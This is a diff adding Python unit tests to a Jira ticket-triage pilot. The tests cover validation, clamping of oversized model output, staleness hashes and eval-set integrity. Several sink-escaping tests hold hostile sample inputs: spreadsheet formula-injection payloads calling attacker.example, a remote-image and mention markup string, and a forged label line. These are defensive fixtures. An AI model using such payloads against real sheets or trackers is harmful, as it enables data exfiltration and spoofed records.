@@ -29,6 +29,7 @@ from triage.classifier import (  # noqa: E402
     SCHEMA,
     Classification,
     Classifier,
+    clamp_classification,
     validate_classification,
 )
 from triage.jira import JiraClient, JiraError  # noqa: E402
@@ -146,6 +147,13 @@ class RecordingJira:
 
     def update_labels(self, key, add, remove):
         self.writes.append(("labels", key, tuple(add), tuple(remove)))
+        # Applied, not just recorded: a stub that accepted writes without
+        # reflecting them would let a second run see pre-write state, which is
+        # exactly the kind of dishonest double that hides a real regression.
+        current = self.issues[key]["fields"]["labels"]
+        self.issues[key]["fields"]["labels"] = (
+            [l for l in current if l not in remove] + list(add)
+        )
 
     def add_comment(self, key, body):
         self.writes.append(("comment", key, body))
@@ -620,7 +628,8 @@ class EvalImportTests(unittest.TestCase):
         self.assertEqual([r["key"] for r in graded], ["O3-1"], log.getvalue())
         self.assertEqual(graded[0]["expected_label"], "needs_more_info")
 
-    def _import(self, context_text, graded_hash, label="needs_more_info"):
+    def _import(self, context_text, graded_hash, label="needs_more_info",
+                source="api", grade="ok", correct_label=""):
         module = load_evals_module()
         with tempfile.TemporaryDirectory() as tmp:
             d = Path(tmp)
@@ -628,10 +637,11 @@ class EvalImportTests(unittest.TestCase):
             (d / "contexts" / "O3-1.txt").write_text(context_text)
             proposals = d / "proposals.csv"
             with open(proposals, "w", newline="") as fh:
-                w = csv.writer(fh)
-                w.writerow(self.HEADER)
-                w.writerow(["O3-1", "u", "s", label, "0.90", "r", "", "",
-                            graded_hash, "ok", "", ""])
+                w = csv.DictWriter(fh, fieldnames=self.HEADER)
+                w.writeheader()
+                w.writerow({"key": "O3-1", "proposed_label": label, "confidence": "0.90",
+                            "content_hash": graded_hash, "source": source,
+                            "grade(ok/wrong)": grade, "correct_label": correct_label})
             # Redirected off the committed evals/ directory.
             module.GRADED = d / "graded.csv"
             module.CONTEXTS = d / "frozen"
@@ -653,6 +663,19 @@ class EvalImportTests(unittest.TestCase):
         self.assertEqual(rows, [])
         self.assertIn("changed since grading", log)
 
+    def test_ok_graded_replay_is_not_admitted_to_the_eval_set(self):
+        # Otherwise the >= 90% gate that authorises go-live would measure the
+        # pinned model against a replay classifier's own decision boundary.
+        rows, log = self._import("TICKET: O3-1\n", ctx.content_hash("TICKET: O3-1\n"),
+                                 source="file")
+        self.assertEqual(rows, [])
+        self.assertIn("source=file", log)
+
+    def test_wrong_graded_replay_is_admitted_because_the_label_is_human(self):
+        rows, _ = self._import("TICKET: O3-1\n", ctx.content_hash("TICKET: O3-1\n"),
+                               source="file", grade="wrong", correct_label="needs_judgment")
+        self.assertEqual([r["expected_label"] for r in rows], ["needs_judgment"])
+
     def test_sheet_without_a_hash_column_still_imports(self):
         # Proposals CSVs produced before the column existed stay usable.
         text = "TICKET: O3-1\n"
@@ -661,9 +684,13 @@ class EvalImportTests(unittest.TestCase):
 
 
 class MetricsJira:
-    def __init__(self, issues, intro_keys):
+    def __init__(self, issues, intro_keys, properties=None):
         self.issues = issues
         self.intro_keys = list(intro_keys)
+        self.properties = properties or {}
+
+    def get_property(self, key, prop):
+        return self.properties.get(key)
 
     def search_keys(self, jql):
         # The intro metric is the only query that filters on labels.
@@ -683,10 +710,10 @@ class MetricsWiringTests(unittest.TestCase):
     24h metric would silently report 100% for every cohort forever.
     """
 
-    def _report(self, issue_json, intro_keys=("O3-1",) * 5):
+    def _report(self, issue_json, intro_keys=("O3-1",) * 5, properties=None):
         cfg = load_config()
         cfg["metrics"] = dict(cfg["metrics"], pilot_launch="2026-08-01")
-        jira = MetricsJira({"O3-1": issue_json}, intro_keys)
+        jira = MetricsJira({"O3-1": issue_json}, intro_keys, properties)
         with mock.patch.dict(os.environ, {"TRIAGE_BOT_ACCOUNT_ID": "bot"}), \
              mock.patch.object(metrics, "load_config", lambda: cfg), \
              mock.patch.object(metrics, "jira_from_env", lambda c: jira), \
@@ -709,6 +736,24 @@ class MetricsWiringTests(unittest.TestCase):
                                             "2026-08-12T09:00:00.000+0000"))
         self.assertIn("sorted within 24h  : 0%", report)
         self.assertNotIn("ADOPT", report)
+
+    def test_a_replayed_label_suppresses_the_decision(self):
+        # The changelog cannot tell a replayed label from a pinned-model one, so
+        # deciding over a mixed cohort would measure two systems as one.
+        report = self._report(
+            self._labeled("2026-08-10T09:00:00.000+0000", "2026-08-10T11:00:00.000+0000"),
+            properties={"O3-1": {"source": "file", "classifier": "session-agent"}})
+        self.assertIn("were not labelled by the pinned model", report)
+        self.assertIn("session-agent", report)
+        self.assertIn("NO DECISION", report)
+        self.assertNotIn("DECISION: ADOPT", report)
+
+    def test_a_property_without_source_counts_as_api(self):
+        # Properties written before `source` existed must not read as replayed.
+        report = self._report(
+            self._labeled("2026-08-10T09:00:00.000+0000", "2026-08-10T11:00:00.000+0000"),
+            properties={"O3-1": {"contentHash": "abc", "prompt": "v1"}})
+        self.assertIn("DECISION: ADOPT", report)
 
     def test_human_relabel_counts_as_removal_and_violation(self):
         report = self._report(issue(
@@ -884,6 +929,94 @@ class LiveRunTests(unittest.TestCase):
         # pinned-model ones - they are not the same experiment.
         self.assertEqual(jira.properties["O3-1"]["classifier"], "session-agent")
 
+    def test_hostile_rationale_from_a_file_is_escaped_in_the_comment(self):
+        # The file path has no server-side constraint at all, so this is the
+        # least trusted route into a public Jira comment.
+        jira = RecordingJira({"O3-1": issue()})
+        text = ctx.assemble(StubJira(), jira.issues["O3-1"], None, ["bot"])
+        hostile = dict(
+            GOOD,
+            content_hash=ctx.content_hash(text),
+            rationale="Ping [~accountid:712020:abc] and see !https://attacker.example/p.png!",
+            missing_info=["ask [~accountid:712020:def]"],
+        )
+        with tempfile.TemporaryDirectory() as d:
+            path = Path(d) / "c.json"
+            path.write_text(json.dumps({
+                "prompt_version": "v1", "classifier": "agent",
+                "classifications": {"O3-1": hostile},
+            }))
+            with mock.patch.dict(os.environ, {"TRIAGE_BOT_ACCOUNT_ID": "bot"}), \
+                 mock.patch.object(run, "jira_from_env", lambda cfg: jira), \
+                 mock.patch.object(run, "Classifier", lambda *a: None), \
+                 contextlib.redirect_stdout(io.StringIO()), \
+                 contextlib.redirect_stderr(io.StringIO()):
+                run.main(["--live", "--keys", "O3-1", "--classifications", str(path)],
+                         out=Path(d))
+        body = next(w[2] for w in jira.writes if w[0] == "comment")
+        self.assertNotIn("[~", body.replace("\\[", ""))
+        self.assertNotIn("!", body.replace("\\!", ""))
+
+    def test_partial_batch_applies_every_covered_ticket(self):
+        # The documented workflow gathers a subset and applies over the sweep, so
+        # misses are routine. Counting them as faults aborted the sweep and
+        # dropped good classifications - here the covered tickets are LAST, the
+        # ordering that previously applied nothing at all.
+        keys = [f"O3-{i}" for i in range(1, 11)]
+        jira = RecordingJira({k: issue() for k in keys})
+        for k in keys:
+            jira.issues[k]["key"] = k
+        covered = keys[-2:]
+        entries = {}
+        for k in covered:
+            text = ctx.assemble(StubJira(), jira.issues[k], None, ["bot"])
+            entries[k] = dict(GOOD, content_hash=ctx.content_hash(text))
+        with tempfile.TemporaryDirectory() as d:
+            path = Path(d) / "c.json"
+            path.write_text(json.dumps({
+                "prompt_version": "v1", "classifier": "agent",
+                "classifications": entries,
+            }))
+            with mock.patch.dict(os.environ, {"TRIAGE_BOT_ACCOUNT_ID": "bot"}), \
+                 mock.patch.object(run, "jira_from_env", lambda cfg: jira), \
+                 mock.patch.object(run, "Classifier", lambda *a: None), \
+                 contextlib.redirect_stdout(io.StringIO()), \
+                 contextlib.redirect_stderr(io.StringIO()):
+                rc = run.main(["--live", "--keys", ",".join(keys),
+                               "--classifications", str(path)], out=Path(d))
+            rows = [json.loads(x) for x in
+                    (Path(d) / "journal.jsonl").read_text().splitlines()]
+        self.assertEqual(rc, 0, "uncovered tickets are skips, not failures")
+        labelled = sorted(w[1] for w in jira.writes if w[0] == "labels")
+        self.assertEqual(labelled, sorted(covered))
+        self.assertEqual(len(rows), len(keys), "the sweep must not abort early")
+        self.assertEqual(sum(r["action"] == "skip-unclassified" for r in rows), 8)
+
+    def test_replayed_label_does_not_block_the_pinned_model(self):
+        # Without comparing source, one replay run would pin those tickets for
+        # the rest of the pilot: the API pipeline would skip them forever.
+        jira = RecordingJira({"O3-1": issue()})
+        text = ctx.assemble(StubJira(), jira.issues["O3-1"], None, ["bot"])
+        with tempfile.TemporaryDirectory() as d:
+            path = Path(d) / "c.json"
+            path.write_text(json.dumps({
+                "prompt_version": "v1", "classifier": "agent",
+                "classifications": {"O3-1": dict(GOOD, content_hash=ctx.content_hash(text))},
+            }))
+            with mock.patch.dict(os.environ, {"TRIAGE_BOT_ACCOUNT_ID": "bot"}), \
+                 mock.patch.object(run, "jira_from_env", lambda cfg: jira), \
+                 mock.patch.object(run, "Classifier", lambda *a: None), \
+                 contextlib.redirect_stdout(io.StringIO()), \
+                 contextlib.redirect_stderr(io.StringIO()):
+                run.main(["--live", "--keys", "O3-1", "--classifications", str(path)],
+                         out=Path(d))
+        self.assertEqual(jira.properties["O3-1"]["source"], "file")
+        jira.writes.clear()
+        # Now the pinned-model path over the same unchanged ticket.
+        row = self._run(jira)
+        self.assertEqual(row["action"], "refreshed")
+        self.assertEqual(jira.properties["O3-1"]["source"], "api")
+
     def test_opted_out_ticket_is_untouched_even_with_force(self):
         jira = RecordingJira({"O3-1": issue(histories=[label_change("u1", AI[2], "")])})
         row = self._run(jira, extra_args=["--force"])
@@ -936,6 +1069,85 @@ class StubAnthropic:
         return self.response
 
 
+class ClampTests(unittest.TestCase):
+    """The API path clamps; discarding a correct label is the costly choice."""
+
+    def test_over_length_fields_are_truncated_not_rejected(self):
+        data = dict(GOOD, label="automation_candidate", missing_info=[],
+                    rationale="x" * 5000, verification_steps=["y" * 500] + ["ok"] * 40)
+        notes = clamp_classification(data)
+        self.assertEqual(validate_classification(data), [],
+                         "clamped data must then pass validation")
+        self.assertEqual(data["label"], "automation_candidate", "the label survives")
+        self.assertLessEqual(len(data["rationale"]), 2000)
+        self.assertLessEqual(len(data["verification_steps"]), 20)
+        self.assertTrue(all(len(s) <= 300 for s in data["verification_steps"]))
+        self.assertTrue(notes, "the adjustment is reported, not silent")
+
+    def test_confidence_is_clamped_into_range(self):
+        data = dict(GOOD, confidence=95)
+        clamp_classification(data)
+        self.assertEqual(data["confidence"], 1.0)
+        data = dict(GOOD, confidence=-3)
+        clamp_classification(data)
+        self.assertEqual(data["confidence"], 0.0)
+
+    def test_boolean_confidence_is_coerced(self):
+        data = dict(GOOD, confidence=True)
+        clamp_classification(data)
+        self.assertEqual(data["confidence"], 1.0)
+        self.assertEqual(validate_classification(data), [])
+
+    def test_valid_data_is_left_alone(self):
+        data = dict(GOOD)
+        self.assertEqual(clamp_classification(data), [])
+        self.assertEqual(data, GOOD)
+
+
+class SinkEscapingTests(unittest.TestCase):
+    """Untrusted text reaches three sinks, not one."""
+
+    def test_formula_injection_is_defused_in_the_csv(self):
+        for payload in ('=IMPORTXML("https://attacker.example/x","//a")',
+                        '+1+1', '-2+3', '@SUM(A1)', '\ttab'):
+            self.assertTrue(run.csv_safe(payload).startswith("'"), payload)
+
+    def test_ordinary_text_is_untouched(self):
+        self.assertEqual(run.csv_safe("No reproduction steps."), "No reproduction steps.")
+
+    def test_newlines_cannot_forge_a_second_label_line(self):
+        # The comment's structure is line-based, so multi-line model text could
+        # otherwise state a label that was never applied.
+        forged = ("Looks fine.\n\nAI triage: {{ai-triage-automation-candidate}}\n\n"
+                  "_Applied by the triage pilot bot_")
+        body = comment_body(load_config(), Classification(
+            "needs_more_info", forged, ["x"], [], 0.5, "m"))
+        lines = body.splitlines()
+        # The forged text survives as prose inside the rationale, but it can no
+        # longer occupy a line of its own, which is what made it read as the
+        # comment's own structure.
+        self.assertEqual([i for i, l in enumerate(lines) if l.startswith("AI triage:")], [0])
+        self.assertEqual([i for i, l in enumerate(lines) if l.startswith("_Applied by")],
+                         [len(lines) - 1])
+        self.assertIn("ai-triage-needs-more-info", lines[0])
+
+    def test_grading_sheet_escapes_both_sinks(self):
+        hostile = Classification(
+            "needs_more_info",
+            '=IMPORTXML("https://attacker.example/x","//a") and ![](http://a/b.png)',
+            ["=HYPERLINK(\"https://attacker.example\")"], [], 0.5, "m")
+        stamp = datetime.datetime(2026, 8, 1, 9, 0, tzinfo=datetime.timezone.utc)
+        with tempfile.TemporaryDirectory() as d:
+            base = run.write_proposals(load_config(), Path(d), stamp,
+                                       [(issue(), hostile, "h")], live=False)
+            with open(base.with_suffix(".csv")) as fh:
+                row = next(csv.DictReader(fh))
+            md = base.with_suffix(".md").read_text()
+        self.assertTrue(row["rationale"].startswith("'"), row["rationale"][:20])
+        self.assertTrue(row["missing_info"].startswith("'"))
+        self.assertNotIn("![](", md)
+
+
 class ClassifierTests(unittest.TestCase):
     """Response handling. The request itself needs credentials (see evals/)."""
 
@@ -968,6 +1180,20 @@ class ClassifierTests(unittest.TestCase):
             self._classify(FakeResponse("max_tokens", [FakeBlock('{"label": "needs')]))
         self.assertIn("max_tokens", str(caught.exception))
 
+    def test_oversized_response_is_clamped_not_discarded(self):
+        # Discarding it would lose the label permanently and re-charge for the
+        # ticket on every sweep, so classify() must clamp rather than reject.
+        payload = json.dumps({"label": "automation_candidate", "rationale": "x" * 5000,
+                              "missing_info": [], "verification_steps": ["y" * 500],
+                              "confidence": 95})
+        with contextlib.redirect_stderr(io.StringIO()) as err:
+            _, c = self._classify(FakeResponse("end_turn", [FakeBlock(payload)]))
+        self.assertEqual(c.label, "automation_candidate")
+        self.assertLessEqual(len(c.rationale), 2000)
+        self.assertEqual(c.confidence, 1.0)
+        self.assertTrue(all(len(s) <= 300 for s in c.verification_steps))
+        self.assertIn("adjusted", err.getvalue())
+
     def test_missing_text_block_raises(self):
         with self.assertRaises(RuntimeError):
             self._classify(FakeResponse("end_turn", [FakeBlock("", type="thinking")]))
@@ -993,6 +1219,93 @@ GOOD = {"label": "needs_more_info", "rationale": "No repro.",
         "missing_info": ["repro steps"], "verification_steps": [], "confidence": 0.9}
 
 
+class ManifestRoundTripTests(unittest.TestCase):
+    """Gather -> classify from the manifest -> apply, with nothing hand-copied."""
+
+    def test_a_file_built_only_from_the_manifest_applies_cleanly(self):
+        jira = RecordingJira({"O3-1": issue(), "O3-2": issue()})
+        jira.issues["O3-2"]["key"] = "O3-2"
+        with tempfile.TemporaryDirectory() as d:
+            out = Path(d)
+            with mock.patch.dict(os.environ, {"TRIAGE_BOT_ACCOUNT_ID": "bot"}), \
+                 mock.patch.object(run, "jira_from_env", lambda cfg: jira), \
+                 mock.patch.object(run, "Classifier", lambda *a: None), \
+                 contextlib.redirect_stdout(io.StringIO()), \
+                 contextlib.redirect_stderr(io.StringIO()):
+                run.main(["--no-classify", "--keys", "O3-1,O3-2"], out=out)
+                manifest = json.loads((out / "manifest.json").read_text())
+
+                # Build entries using ONLY what the manifest advertises.
+                entry_schema = manifest["entry_schema"]
+                self.assertIn("content_hash", entry_schema["required"],
+                              "a consumer obeying this schema must be able to include it")
+                self.assertIn("content_hash", entry_schema["properties"])
+                entries = {}
+                for key, info in manifest["tickets"].items():
+                    self.assertTrue((out / info["context"]).is_file())
+                    entries[key] = {
+                        "content_hash": info["content_hash"],
+                        "label": "needs_more_info", "rationale": "No repro.",
+                        "missing_info": ["repro steps"], "verification_steps": [],
+                        "confidence": 0.9,
+                    }
+                    self.assertEqual(
+                        sorted(entries[key]), sorted(entry_schema["required"]),
+                        "the schema's required set must be exactly what an entry needs")
+                path = out / "c.json"
+                path.write_text(json.dumps({
+                    "prompt_version": manifest["prompt_version"],
+                    "classifier": "round-trip", "classifications": entries,
+                }))
+                rc = run.main(["--live", "--keys", "O3-1,O3-2",
+                               "--classifications", str(path)], out=out)
+        self.assertEqual(rc, 0)
+        self.assertEqual(sorted(w[1] for w in jira.writes if w[0] == "labels"),
+                         ["O3-1", "O3-2"])
+
+    def test_the_apply_run_does_not_overwrite_the_gather_manifest(self):
+        jira = RecordingJira({"O3-1": issue(), "O3-2": issue()})
+        jira.issues["O3-2"]["key"] = "O3-2"
+        with tempfile.TemporaryDirectory() as d:
+            out = Path(d)
+            with mock.patch.dict(os.environ, {"TRIAGE_BOT_ACCOUNT_ID": "bot"}), \
+                 mock.patch.object(run, "jira_from_env", lambda cfg: jira), \
+                 mock.patch.object(run, "Classifier", lambda *a: None), \
+                 contextlib.redirect_stdout(io.StringIO()), \
+                 contextlib.redirect_stderr(io.StringIO()):
+                run.main(["--no-classify", "--keys", "O3-1,O3-2"], out=out)
+                before = (out / "manifest.json").read_text()
+                text = ctx.assemble(StubJira(), jira.issues["O3-1"], None, ["bot"])
+                path = out / "c.json"
+                path.write_text(json.dumps({
+                    "prompt_version": "v1", "classifier": "agent",
+                    "classifications": {"O3-1": dict(GOOD, content_hash=ctx.content_hash(text))},
+                }))
+                run.main(["--live", "--keys", "O3-1", "--classifications", str(path)], out=out)
+                after = (out / "manifest.json").read_text()
+        self.assertEqual(before, after,
+                         "a narrower apply run must not clobber the gather's manifest")
+
+    def test_skipped_tickets_are_not_offered_for_classification(self):
+        # An opted-out ticket must not be advertised: the pilot promised never to
+        # touch it again, so classifying it is wasted effort on a dead ticket.
+        jira = RecordingJira({
+            "O3-1": issue(),
+            "O3-2": issue(histories=[label_change("u1", AI[2], "")]),
+        })
+        jira.issues["O3-2"]["key"] = "O3-2"
+        with tempfile.TemporaryDirectory() as d:
+            out = Path(d)
+            with mock.patch.dict(os.environ, {"TRIAGE_BOT_ACCOUNT_ID": "bot"}), \
+                 mock.patch.object(run, "jira_from_env", lambda cfg: jira), \
+                 mock.patch.object(run, "Classifier", lambda *a: None), \
+                 contextlib.redirect_stdout(io.StringIO()), \
+                 contextlib.redirect_stderr(io.StringIO()):
+                run.main(["--no-classify", "--keys", "O3-1,O3-2"], out=out)
+            manifest = json.loads((out / "manifest.json").read_text())
+        self.assertEqual(sorted(manifest["tickets"]), ["O3-1"])
+
+
 class ValidateClassificationTests(unittest.TestCase):
     def test_valid_object_has_no_errors(self):
         self.assertEqual(validate_classification(dict(GOOD)), [])
@@ -1015,6 +1328,26 @@ class ValidateClassificationTests(unittest.TestCase):
     def test_unexpected_field_is_reported(self):
         self.assertTrue(any("unexpected field" in e for e in
                             validate_classification(dict(GOOD, sneaky="x"))))
+
+    def test_confidence_outside_zero_to_one_is_reported(self):
+        # The prompt asks for an honest 0-1 estimate; nothing in the schema can
+        # enforce a range, and it is rendered into the comment and the CSV.
+        for bad in (1.5, -0.2, 99):
+            self.assertTrue(any("between 0 and 1" in e for e in
+                                validate_classification(dict(GOOD, confidence=bad))), bad)
+        for ok in (0, 1, 0.5):
+            self.assertEqual(validate_classification(dict(GOOD, confidence=ok)), [], ok)
+
+    def test_oversized_text_is_reported(self):
+        # A file is not bound by the prompt's two-sentence rule, and this text is
+        # posted to a public ticket.
+        long_rationale = "x" * 5000
+        self.assertTrue(any("over the" in e for e in
+                            validate_classification(dict(GOOD, rationale=long_rationale))))
+        self.assertTrue(any("over the" in e for e in
+                            validate_classification(dict(GOOD, missing_info=["y" * 500]))))
+        self.assertTrue(any("over the" in e for e in
+                            validate_classification(dict(GOOD, missing_info=["z"] * 50))))
 
 
 class FileClassifierTests(unittest.TestCase):
@@ -1039,13 +1372,48 @@ class FileClassifierTests(unittest.TestCase):
 
     def test_edited_context_finds_no_classification(self):
         # The hash is the staleness guard: a label made against older text must
-        # never reach Jira.
+        # never reach Jira. Raised as NotClassified, which is a skip rather than
+        # a fault, so it cannot trip the paid-fault circuit breaker.
         with tempfile.TemporaryDirectory() as tmp:
             path = self._write(tmp, dict(GOOD, content_hash=ctx.content_hash("TICKET: O3-1\n")))
             fc = run.FileClassifier(path, "v1")
-        with self.assertRaises(RuntimeError) as caught:
+        with self.assertRaises(run.NotClassified) as caught:
             fc.classify("TICKET: O3-1 (edited)\n")
-        self.assertIn("changed since it was classified", str(caught.exception))
+        self.assertIn("not in this batch", str(caught.exception))
+
+    def test_mispaired_content_hash_is_refused(self):
+        # Swapping two entries' hashes would apply each ticket's label and
+        # rationale to the other, and both hashes are individually valid.
+        one, two = "TICKET: O3-1\nSUMMARY: a\n", "TICKET: O3-2\nSUMMARY: b\n"
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "c.json"
+            path.write_text(json.dumps({
+                "prompt_version": "v1", "classifier": "agent",
+                "classifications": {
+                    "O3-1": dict(GOOD, content_hash=ctx.content_hash(two)),
+                    "O3-2": dict(GOOD, content_hash=ctx.content_hash(one)),
+                },
+            }))
+            fc = run.FileClassifier(path, "v1")
+        with self.assertRaises(RuntimeError) as caught:
+            fc.classify(one)
+        self.assertIn("mispaired", str(caught.exception))
+
+    def test_boolean_confidence_is_refused(self):
+        # bool is an int in Python; unguarded this renders as a confidence of
+        # 1.00. The file path rejects because its author can fix it.
+        with tempfile.TemporaryDirectory() as tmp:
+            path = self._write(tmp, dict(GOOD, content_hash="abc", confidence=True))
+            with self.assertRaises(SystemExit) as caught:
+                run.FileClassifier(path, "v1")
+        self.assertIn("must be a number", str(caught.exception))
+
+    def test_non_string_content_hash_is_refused(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            path = self._write(tmp, dict(GOOD, content_hash=12345))
+            with self.assertRaises(SystemExit) as caught:
+                run.FileClassifier(path, "v1")
+        self.assertIn("must be a string", str(caught.exception))
 
     def test_prompt_version_mismatch_is_refused(self):
         with tempfile.TemporaryDirectory() as tmp:
@@ -1067,6 +1435,72 @@ class FileClassifierTests(unittest.TestCase):
             with self.assertRaises(SystemExit) as caught:
                 run.FileClassifier(path, "v1")
         self.assertIn("not a valid classification", str(caught.exception))
+
+    def test_missing_file_is_named(self):
+        with self.assertRaises(SystemExit) as caught:
+            run.FileClassifier(Path("/nonexistent/classifications.json"), "v1")
+        self.assertIn("no such file", str(caught.exception))
+
+    def test_malformed_json_is_named(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "c.json"
+            path.write_text("{not json")
+            with self.assertRaises(SystemExit) as caught:
+                run.FileClassifier(path, "v1")
+        self.assertIn("not valid JSON", str(caught.exception))
+
+    def test_non_object_document_is_refused(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "c.json"
+            path.write_text('["nope"]')
+            with self.assertRaises(SystemExit) as caught:
+                run.FileClassifier(path, "v1")
+        self.assertIn("expected a JSON object", str(caught.exception))
+
+    def test_empty_classifications_is_refused(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "c.json"
+            path.write_text(json.dumps({"prompt_version": "v1", "classifications": {}}))
+            with self.assertRaises(SystemExit) as caught:
+                run.FileClassifier(path, "v1")
+        self.assertIn("no classifications", str(caught.exception))
+
+    def test_local_faults_fail_before_any_jira_call(self):
+        # A bad file is a purely local fault; failing after a full JQL sweep
+        # wastes the sweep and buries the error under later stdout.
+        def explode(cfg):
+            raise AssertionError("Jira must not be contacted for a local fault")
+
+        with tempfile.TemporaryDirectory() as tmp:
+            bad = Path(tmp) / "c.json"
+            bad.write_text(json.dumps({
+                "prompt_version": "v1",
+                "classifications": {"O3-1": dict(GOOD, content_hash="a", confidence=42)},
+            }))
+            with mock.patch.object(run, "jira_from_env", explode), \
+                 contextlib.redirect_stderr(io.StringIO()):
+                with self.assertRaises(SystemExit):
+                    run.main(["--keys", "O3-1", "--classifications", str(bad)], out=Path(tmp))
+                with self.assertRaises(SystemExit):
+                    run.main(["--keys", "O3-1", "--no-classify",
+                              "--classifications", str(bad)], out=Path(tmp))
+
+    def test_duplicate_content_hash_is_refused(self):
+        # Lookup is by hash, so a repeat would silently overwrite and which
+        # label landed would depend on dict order.
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "c.json"
+            path.write_text(json.dumps({
+                "prompt_version": "v1", "classifier": "agent",
+                "classifications": {
+                    "O3-1": dict(GOOD, content_hash="same"),
+                    "O3-2": dict(GOOD, content_hash="same", label="needs_judgment",
+                                 missing_info=[]),
+                },
+            }))
+            with self.assertRaises(SystemExit) as caught:
+                run.FileClassifier(path, "v1")
+        self.assertIn("share content_hash", str(caught.exception))
 
 
 class ConfigTests(unittest.TestCase):
